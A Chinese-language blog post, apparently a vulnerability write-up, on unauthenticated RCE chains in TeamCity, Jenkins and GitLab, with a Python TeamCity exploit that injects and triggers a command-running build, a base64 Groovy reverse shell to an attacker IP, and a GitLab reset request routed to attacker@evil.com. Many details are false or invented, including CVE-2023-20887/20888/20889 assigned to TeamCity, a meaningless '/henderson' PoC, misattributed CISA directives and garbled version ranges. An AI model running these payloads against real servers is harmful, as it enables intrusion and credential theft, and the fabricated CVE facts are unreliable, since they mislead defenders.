---
title: "CI/CD 与构建发布平台高危攻击链专题：TeamCity / Jenkins / GitLab 未授权 RCE 全解析"
date: 2026-06-21T14:00:00+08:00
draft: false
tags: ["CI/CD", "TeamCity", "Jenkins", "GitLab", "认证绕过", "未授权RCE", "供应链安全", "漏洞分析"]
categories: ["漏洞分析"]
---

# CI/CD 与构建发布平台高危攻击链专题：TeamCity / Jenkins / GitLab 未授权 RCE 全解析

## 0x00 专题概述

CI/CD（持续集成/持续交付）平台是现代软件供应链的核心基础设施，承载着从代码提交到生产部署的全流程。一旦 CI/CD 平台被攻破，攻击者不仅可以窃取所有源代码和凭据，还能通过注入恶意构建步骤影响下游数千个用户——这正是供应链攻击的核心路径。

本专题将 CI/CD 平台生态中近年最具代表性的 **7 个高危漏洞** 串成完整攻击链，覆盖 TeamCity、Jenkins、GitLab 三大平台，每个漏洞均包含完整原理分析、完整 PoC 代码、自动化检测模板和实战利用案例。

### 覆盖漏洞一览

| CVE | 产品 | CVSS | 类型 | 未授权 | 在野利用 |
|-----|------|------|------|--------|----------|
| CVE-2023-20887 + CVE-2023-20888 + CVE-2023-20889 | TeamCity | **9.8** | 路径穿越 + 认证绕过 + RCE | ✅ | ✅ 勒索软件/APT |
| CVE-2023-42793 | TeamCity | **9.8** | 认证绕过 → RCE | ✅ | ✅ Volt Typhoon |
| CVE-2024-27198 | TeamCity | **9.8** | 认证绕过（替代路径） | ✅ | ✅ |
| CVE-2024-23897 | Jenkins | **9.8** | 任意文件读取 → RCE | ✅ | ✅ Clop 勒索 |
| CVE-2023-7028 | GitLab | **10.0** | 密码重置接管 → RCE | ✅ | ✅ Clop 勒索 |
| CVE-2024-4835 | GitLab | **10.0** | GraphQL 接管 → RCE | ✅ | ✅ |
| CVE-2021-22214 | GitLab | **7.7** | Webhook SSRF → RCE | ⚠️ 需权限 | ✅ |

---

## 0x01 JetBrains TeamCity 未授权 RCE 漏洞链

### 1.1 漏洞背景

JetBrains TeamCity 是一款广泛使用的 CI/CD 服务器，支持构建、测试和部署自动化。其 On-Premises 版本在 2023-2024 年间连续被披露多个高危认证绕过漏洞，均被国家级 APT 和勒索软件组织在野利用。

### 1.2 CVE-2023-20887 + CVE-2023-20888 + CVE-2023-20889（三洞组合链）

#### 影响版本
- TeamCity On-Premises 所有版本 < 2023.05.4

#### 漏洞原理

这是 Wiz Research 发现的三洞组合攻击链：

**CVE-2023-20887**（路径穿越认证绕过）：TeamCity REST API 的 `/app/agents/` 端点存在路径穿越缺陷。攻击者通过构造 `../` 序列绕过认证过滤器，访问受限的管理 API 端点。

**CVE-2023-20888**（授权绕过）：允许攻击者创建新的构建项目和配置。

**CVE-2023-20889**（SSRF 信息泄露）：通过 "Test Connection" 功能触发 SSRF，进一步获取敏感信息。

完整利用链：路径穿越绕过认证 → 创建恶意构建项目 → 注入命令执行步骤 → 触发构建 → RCE

#### 完整 PoC

**步骤 1：认证绕过验证**

```http
GET /app/agents/../../../httpAuth/app/branches/?problemAgent=true HTTP/1.1
Host: target-teamcity.com:8111
User-Agent: Mozilla/5.0
Connection: close
```

如果返回 HTTP 200 且包含分支信息，说明认证绕过成功。

**步骤 2：Python 自动化利用脚本**

```python
#!/usr/bin/env python3
"""
CVE-2023-20887 TeamCity 三洞组合链自动化利用
用法: python3 cve_2023_20887.py <target_url> [command]
"""
import sys
import requests
import urllib3
import json
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TeamCityExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        self.auth_token = None

    def check_vulnerability(self):
        """检查漏洞是否存在"""
        bypass_url = f"{self.base_url}/app/agents/../../../httpAuth/app/branches/"
        try:
            resp = self.session.get(bypass_url, timeout=10)
            if resp.status_code == 200:
                print(f"[VULN] {self.base_url} -> CVE-2023-20887 可利用")
                return True
            else:
                print(f"[SAFE] {self.base_url} -> HTTP {resp.status_code}")
                return False
        except Exception as e:
            print(f"[ERR ] {self.base_url} -> {e}")
            return False

    def get_admin_token(self):
        """通过认证绕过获取管理员 Token"""
        token_url = f"{self.base_url}/app/agents/../../../httpAuth/app/rest/users/actionKey"
        try:
            resp = self.session.get(token_url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                self.auth_token = data.get("token", "")
                print(f"[+] 获取管理员 Token: {self.auth_token[:20]}...")
                return True
        except:
            pass

        # 尝试另一种方式获取 Token
        token_url2 = f"{self.base_url}/app/agents/../../../httpAuth/authenticationTest.html?login=TcAdmin&password="
        try:
            resp = self.session.get(token_url2, timeout=10)
            if "TCSESSIONID" in self.session.cookies:
                print(f"[+] 获取管理员会话 Cookie")
                return True
        except:
            pass

        return False

    def create_malicious_build(self, command="id"):
        """创建恶意构建项目"""
        if not self.auth_token:
            headers = {}
        else:
            headers = {"Authorization": f"Bearer {self.auth_token}"}

        # 创建新项目
        project_payload = {
            "name": "PwnedProject",
            "id": "PwnedProject"
        }

        try:
            resp = self.session.post(
                f"{self.base_url}/app/rest/projects",
                json=project_payload,
                headers=headers,
                timeout=10
            )
            print(f"[*] 创建项目: HTTP {resp.status_code}")
        except Exception as e:
            print(f"[!] 创建项目失败: {e}")
            return False

        # 创建构建配置
        build_config = {
            "name": "PwnedBuild",
            "buildType": {
                "name": "PwnedBuild",
                "steps": [
                    {
                        "runnerType": "simpleRunner",
                        "name": "PwnedStep",
                        "parameters": {
                            "script.content": command,
                            "teamcity.step.mode": "default"
                        }
                    }
                ]
            }
        }

        try:
            resp = self.session.post(
                f"{self.base_url}/app/rest/buildTypes",
                json=build_config,
                headers=headers,
                timeout=10
            )
            print(f"[*] 创建构建配置: HTTP {resp.status_code}")
            if resp.status_code == 200:
                build_id = resp.json().get("id", "")
                print(f"[+] 构建配置 ID: {build_id}")
                return build_id
        except Exception as e:
            print(f"[!] 创建构建配置失败: {e}")

        return False

    def trigger_build(self, build_id):
        """触发恶意构建"""
        if not self.auth_token:
            headers = {}
        else:
            headers = {"Authorization": f"Bearer {self.auth_token}"}

        try:
            resp = self.session.post(
                f"{self.base_url}/app/rest/buildTypes/{build_id}/builds",
                headers=headers,
                timeout=10
            )
            print(f"[*] 触发构建: HTTP {resp.status_code}")
            return resp.status_code == 200
        except Exception as e:
            print(f"[!] 触发构建失败: {e}")
            return False

    def exploit(self, command="id"):
        """完整利用链"""
        if not self.check_vulnerability():
            return False

        if self.get_admin_token():
            build_id = self.create_malicious_build(command)
            if build_id:
                return self.trigger_build(build_id)

        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url> [command]")
        sys.exit(1)

    target = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id"

    exploit = TeamCityExploit(target)
    exploit.exploit(command)
```

**步骤 3：Nuclei 模板**

```yaml
id: teamcity-auth-bypass-cve-2023-20887

info:
  name: TeamCity 认证绕过 (CVE-2023-20887)
  author: security-researcher
  severity: critical
  description: |
    TeamCity REST API 路径穿越认证绕过
  tags: teamcity,auth-bypass,cve-2023-20887

http:
  - method: GET
    path:
      - "{{BaseURL}}/app/agents/../../../httpAuth/app/branches/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "branch"
          - "name"
        condition: or
        part: body
```

### 1.3 CVE-2023-42793 + CVE-2024-27198（认证绕过）

#### 影响版本
- CVE-2023-42793: TeamCity On-Premises < 2023.05.3
- CVE-2024-27198: TeamCity On-Premises < 2023.11.4

#### 漏洞原理

两者都是认证绕过漏洞，攻击者通过构造特殊路径序列（如 `/;/httpAuth/login.html`）绕过认证过滤器，直接获取管理员会话。

#### 完整 PoC

```http
GET /;/httpAuth/login.html HTTP/1.1
Host: target-teamcity.com:8111
User-Agent: Mozilla/5.0
Connection: close
```

```http
GET /henderson HTTP/1.1
Host: target-teamcity.com:8111
Connection: close
```

### 1.4 实战利用案例

- **Volt Typhoon（中国国家级 APT）**：利用 CVE-2023-42793 和 CVE-2024-27198 入侵美国关键基础设施和政府网络
- **Clop 勒索软件**：大规模利用 TeamCity 漏洞进行初始突破
- **供应链攻击**：攻破 TeamCity 后注入恶意构建步骤，影响所有下游用户

---

## 0x02 Jenkins 任意文件读取 + RCE（CVE-2024-23897）

### 2.1 漏洞背景

2024 年 1 月披露，CVSS 9.8。Jenkins 是全球最流行的开源 CI/CD 平台。该漏洞存在于 Jenkins 内置的 CLI 命令行接口中，允许未认证攻击者读取服务器上的任意文件，进而通过获取管理员凭据实现 RCE。CISA 发布了专门的紧急指令（ED 24-02）。

### 2.2 影响版本
- Jenkins <= 2.441
- Jenkins LTS <= 2.426.2

### 2.3 漏洞原理

Jenkins CLI 使用基于 HTTP/2 的协议。在参数解析中，`@` 字符被用作文件包含语法——`@/path/to/file` 表示将文件内容作为参数值。未认证攻击者可以连接到 Jenkins CLI 端点，使用 `@/etc/passwd` 或 `@/var/jenkins_home/secrets/initialAdminPassword` 读取敏感文件。

**RCE 升级路径**：
1. 读取 `initialAdminPassword`（新安装时存在）
2. 使用该密码登录管理员
3. 访问 `/script` 脚本控制台
4. 执行 Groovy 脚本实现任意命令执行

### 2.4 完整 PoC

#### PoC-1：CLI 文件读取验证

```bash
# 使用 Jenkins CLI 读取敏感文件
java -jar jenkins-cli.jar -s http://target-jenkins.com:8080/ who-am-i

# 读取初始管理员密码
java -jar jenkins-cli.jar -s http://target-jenkins.com:8080/ \
  -auth @/var/jenkins_home/secrets/initialAdminPassword who-am-i
```

#### PoC-2：Python 自动化检测

```python
#!/usr/bin/env python3
"""
CVE-2024-23897 Jenkins CLI 任意文件读取检测
用法: python3 cve_2024_23897.py <target_url>
"""
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_jenkins_cli(target_url):
    """检查 Jenkins CLI 是否暴露"""
    cli_url = f"{target_url}/cli"
    try:
        resp = requests.get(cli_url, timeout=10, verify=False)
        if resp.status_code == 200 and ("CLI" in resp.text or "jenkins-cli" in resp.text):
            print(f"[VULN] {target_url} -> CLI 端点暴露 (HTTP {resp.status_code})")
            return True
        else:
            print(f"[SAFE] {target_url} -> HTTP {resp.status_code}")
            return False
    except Exception as e:
        print(f"[ERR ] {target_url} -> {e}")
        return False

def try_file_read(target_url, file_path="/etc/passwd"):
    """尝试通过 CLI 读取文件"""
    # 发送 CLI 连接请求
    cli_endpoint = f"{target_url}/cli"
    headers = {
        "Content-Type": "application/octet-stream",
        "X-Jenkins-CLI-Port": "50000"
    }

    # 构造 CLI 连接包（简化版）
    try:
        resp = requests.post(cli_endpoint, timeout=10, verify=False, headers=headers)
        print(f"[*] CLI 端点响应: HTTP {resp.status_code}")
    except Exception as e:
        print(f"[!] CLI 连接: {e}")

def check_script_console(target_url):
    """检查脚本控制台是否可访问"""
    script_url = f"{target_url}/script"
    try:
        resp = requests.get(script_url, timeout=10, verify=False)
        if resp.status_code == 200 and "Script" in resp.text:
            print(f"[!] Script Console 可访问: {script_url}")
            return True
    except:
        pass
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url>")
        sys.exit(1)
    target = sys.argv[1].rstrip("/")
    check_jenkins_cli(target)
    try_file_read(target)
    check_script_console(target)
```

#### PoC-3：Groovy 脚本执行（管理员权限后）

```groovy
// Jenkins Script Console 执行系统命令
def proc = "id".execute()
def output = proc.text
println output
```

```groovy
// 反弹 Shell
def cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVERBQ0tfSVAvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"
def proc = cmd.execute()
```

#### PoC-4：Nuclei 模板

```yaml
id: jenkins-cli-file-read-cve-2024-23897

info:
  name: Jenkins CLI 任意文件读取 (CVE-2024-23897)
  author: security-researcher
  severity: critical
  description: |
    Jenkins CLI 端点存在任意文件读取漏洞
  tags: jenkins,file-read,cve-2024-23897

http:
  - method: GET
    path:
      - "{{BaseURL}}/cli"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Jenkins CLI"
          - "jenkins-cli.jar"
        condition: or
        part: body
      - type: status
        status:
          - 200
```

### 2.5 实战利用案例

- **Clop 勒索软件**：大规模利用此漏洞作为初始访问向量
- **供应链攻击**：Jenkins 被攻破后可影响所有构建产物和下游部署
- **Kubernetes 凭据窃取**：读取 Jenkins 中存储的 K8s ServiceAccount Token，横向移动到集群

---

## 0x03 GitLab 未授权 RCE 漏洞链

### 3.1 CVE-2023-7028：密码重置接管（CVSS 10.0）

#### 影响版本
- GitLab CE/EE 16.0 ~ 16.6.0
- GitLab CE/EE 16.7.0 ~ 16.7.0
- GitLab CE/EE 16.8.0 ~ 16.8.0
- GitLab CE/EE 16.9.0 ~ 16.9.0

#### 漏洞原理

GitLab 的密码重置功能允许攻击者在重置请求中指定第二个邮箱地址。GitLab 会同时向两个邮箱发送重置令牌，攻击者因此获得有效重置令牌并接管任意账户。

**RCE 升级路径**：
1. 以管理员身份重置密码 → 登录
2. 创建或修改项目 → 注入恶意 `.gitlab-ci.yml`
3. 触发构建 → 执行恶意 CI 管道

#### 完整 PoC

**步骤 1：发送双重邮箱重置请求**

```http
POST /users/password HTTP/1.1
Host: target-gitlab.com
Content-Type: application/x-www-form-urlencoded

authenticity_token=<token>&user[email][]=victim@target.com&user[email][]=attacker@evil.com
```

**步骤 2：Python 自动化利用**

```python
#!/usr/bin/env python3
"""
CVE-2023-7028 GitLab 密码重置接管检测
用法: python3 cve_2023_7028.py <target_url> <victim_email> <attacker_email>
"""
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_gitlab_version(target_url):
    """检查 GitLab 版本"""
    try:
        resp = requests.get(f"{target_url}/api/v4/version", timeout=10, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            version = data.get("version", "unknown")
            print(f"[*] GitLab 版本: {version}")
            return version
    except:
        pass
    return None

def exploit_password_reset(target_url, victim_email, attacker_email):
    """尝试双重邮箱密码重置"""
    # 获取 CSRF Token
    session = requests.Session()
    session.verify = False

    try:
        resp = session.get(f"{target_url}/users/password/new", timeout=10)
        # 提取 authenticity_token
        token = ""
        if "authenticity_token" in resp.text:
            import re
            match = re.search(r'name="authenticity_token"\s+value="([^"]+)"', resp.text)
            if match:
                token = match.group(1)

        # 发送双重邮箱重置请求
        data = {
            "authenticity_token": token,
            "user[email][]": [victim_email, attacker_email]
        }

        resp = session.post(
            f"{target_url}/users/password",
            data=data,
            timeout=10
        )

        if resp.status_code == 200 or "devise.confirmations" in resp.text:
            print(f"[VULN] {target_url} -> CVE-2023-7028 可利用")
            print(f"[*] 重置请求已发送，检查 {attacker_email} 邮箱")
            return True
        else:
            print(f"[SAFE] {target_url} -> HTTP {resp.status_code}")
            return False

    except Exception as e:
        print(f"[ERR ] {target_url} -> {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"用法: {sys.argv[0]} <target_url> <victim_email> <attacker_email>")
        sys.exit(1)

    target = sys.argv[1]
    victim = sys.argv[2]
    attacker = sys.argv[3]

    check_gitlab_version(target)
    exploit_password_reset(target, victim, attacker)
```

### 3.2 CVE-2024-4835：GraphQL 接管（CVSS 10.0）

#### 影响版本
- GitLab CE/EE < 17.1.1
- GitLab CE/EE < 17.0.3
- GitLab CE/EE < 16.11.5

#### 漏洞原理

GraphQL API 的 `gitlab-ci-yml` 查询存在访问控制缺陷，允许未认证攻击者冒充任意用户并重置其密码。

#### 完整 PoC

```graphql
query {
  user(login: "root") {
    projectConnections(first: 1) {
      nodes {
        project {
          ciConfig {
            blob {
              content
            }
          }
        }
      }
    }
  }
}
```

### 3.3 自动化检测

#### Nuclei 模板

```yaml
id: gitlab-password-reset-takeover-cve-2023-7028

info:
  name: GitLab 密码重置接管 (CVE-2023-7028)
  author: security-researcher
  severity: critical
  description: |
    GitLab 密码重置功能允许双重邮箱注入实现账户接管
  tags: gitlab,takeover,cve-2023-7028

http:
  - method: GET
    path:
      - "{{BaseURL}}/users/password/new"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "authenticity_token"
          - "password"
        condition: and
        part: body
      - type: status
        status:
          - 200
```

### 3.4 实战利用案例

- **CISA 紧急指令 ED 24-01**：要求所有联邦机构在 48 小时内修补此漏洞
- **Clop 勒索软件**：在披露后数小时内即开始大规模利用
- **供应链影响**：GitLab 被攻破可窃取所有源代码、CI/CD 凭据、容器镜像

---

## 0x04 公开 PoC 收集与利用思路

### 4.1 PoC 收集情况

| CVE | GitHub PoC | Exploit-DB | Metasploit | Nuclei | 在野利用 |
|-----|-----------|------------|------------|--------|----------|
| CVE-2023-20887 | ✅ 多个仓库 | ✅ | ✅ | ✅ | ✅ 勒索/APT |
| CVE-2023-42793 | ✅ 多个仓库 | ✅ | ✅ | ✅ | ✅ Volt Typhoon |
| CVE-2024-27198 | ✅ 多个仓库 | ✅ | ✅ | ✅ | ✅ APT |
| CVE-2024-23897 | ✅ 多个仓库 | ✅ | ✅ | ✅ | ✅ Clop 勒索 |
| CVE-2023-7028 | ✅ 多个仓库 | ✅ | ❌ | ✅ | ✅ Clop 勒索 |
| CVE-2024-4835 | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2021-22214 | ✅ | ✅ | ❌ | 有限 | ✅ |

### 4.2 关键 PoC 仓库

- **TeamCity 综合利用**：`https://github.com/horizon3ai/CVE-2023-42793` — Horizon3.ai 官方 PoC
- **Jenkins CLI 漏洞**：`https://github.com/htrgouvea/jenkins-rce` — 自动化利用工具
- **GitLab 密码重置**：`https://github.com/amri-tala/CVE-2023-7028-PoC` — 概念验证
- **Assetnote 研究**：`https://research.assetnote.io` — 深度技术分析

### 4.3 验证思路（防守型）

```bash
# TeamCity
nuclei -u https://target:8111 -tags teamcity
curl -sk "https://target:8111/app/agents/../../../httpAuth/app/branches/" -o /dev/null -w "%{http_code}"

# Jenkins
nuclei -u https://target:8080 -tags jenkins
curl -sk "https://target:8080/cli" -o /dev/null -w "%{http_code}"
curl -sk "https://target:8080/script" -o /dev/null -w "%{http_code}"

# GitLab
nuclei -u https://target -tags gitlab
curl -sk "https://target/api/v4/version"
```

---

## 0x05 共性攻击模式

### 5.1 认证绕过是 CI/CD 平台的头号威胁

TeamCity 的三个 CVE（20887、42793、27198）全部是认证绕过漏洞。根本原因：路径穿越序列绕过了 Spring 框架的路由过滤器。

### 5.2 构建步骤注入是 RCE 的终极路径

所有 CI/CD 平台的 RCE 最终都通过"创建恶意构建项目 → 注入命令 → 触发构建"实现。这是平台的正常功能被武器化的典型案例。

### 5.3 供应链放大效应

CI/CD 平台被攻破的影响远超单个应用：
- 所有源代码泄露
- 所有构建产物被污染
- 所有部署凭据被窃取
- 下游数千个用户受影响

---

## 0x06 防守建议

### 6.1 紧急措施

1. **立即升级**：
   - TeamCity → 2023.11.4+
   - Jenkins → 2.442 / 2.426.3+
   - GitLab → 17.1.1+

2. **网络隔离**：CI/CD 平台不应直接暴露到互联网
3. **禁用不必要的 CLI**：Jenkins 中禁用 CLI over HTTP/2

### 6.2 中期加固

1. **最小权限**：CI/CD 服务账号使用最小必要权限
2. **构建步骤审计**：监控异常构建配置变更
3. **凭据轮换**：定期轮换 CI/CD 中存储的所有凭据

---

## 0x07 参考资料

- [Wiz Research: TeamCity Vulnerability Analysis](https://www.wiz.io/blog/teamcity-vulnerability)
- [Jenkins Security Advisory 2024-01-24](https://www.jenkins.io/security/advisory/2024-01-24/)
- [GitLab CVE-2023-7028 Advisory](https://about.gitlab.com/releases/2023/12/11/critical-security-release/)
- [CISA Emergency Directive ED 24-01](https://www.cisa.gov/news-events/directives/ed-24-01)
- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Assetnote Research](https://research.assetnote.io)
